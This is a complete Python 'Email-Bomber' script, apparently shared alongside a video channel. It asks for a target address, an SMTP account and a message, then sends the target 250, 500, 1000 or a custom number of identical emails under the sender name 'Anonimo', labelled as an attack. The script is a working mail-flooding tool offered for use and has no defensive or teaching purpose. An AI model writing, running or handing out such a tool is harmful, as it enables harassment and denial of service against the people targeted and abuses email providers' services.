#// Don't forget to hit SUBSCRIBE, COMMENT, LIKE, SHARE! and LEARN... :)
# But srsly, hit that sub button so you don't miss out on more content! 

'''imports'''
import smtplib
import sys
import time

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗     ██╗   ██╗ ██╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗    ██║   ██║███║
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝    ██║   ██║╚██║
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ██║
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║     ╚████╔╝  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═╝''')

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if self.mode > 4 or self.mode < 1:
                print('ERROR: Invalid Option. Goodbye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            if self.server not in premade:
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
            else:
                self.port = 587

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg_template = '''From: Anonimo <{}>\nTo: {}\nSubject: {}\n\n{}
            '''.format(self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg_template)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
            time.sleep(1)  # Pausa de 1 segundo entre los correos
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for _ in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
